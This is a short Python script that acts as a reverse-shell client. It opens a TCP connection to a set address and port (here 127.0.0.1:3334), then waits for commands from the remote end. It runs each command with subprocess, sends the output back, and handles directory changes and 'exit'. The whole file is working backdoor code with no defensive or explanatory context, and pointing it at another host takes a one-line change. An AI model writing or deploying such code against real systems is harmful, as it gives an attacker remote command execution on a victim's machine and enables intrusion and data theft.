import socket 
import subprocess
import os

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = '127.0.0.1'
port = 3334

c.connect((ip, port))

while 1:
    msg = c.recv(1024).decode('ascii')
    if str(msg).startswith('cd'):
        try:
            d = str(msg).replace('cd ', '')
            os.chdir(d)
            c.send("True".encode('ascii'))
        except Exception as E2:
            c.send(f'faild: {E2}'.encode('ascii'))
    
    elif str(msg) == "exit":
        exit()
    
    else:
        try:
            data = subprocess.getoutput(msg)
            c.send(f"""{data}""".encode('ascii'))
        except Exception as e:
            c.send(f'faild: {e}'.encode('ascii'))

    
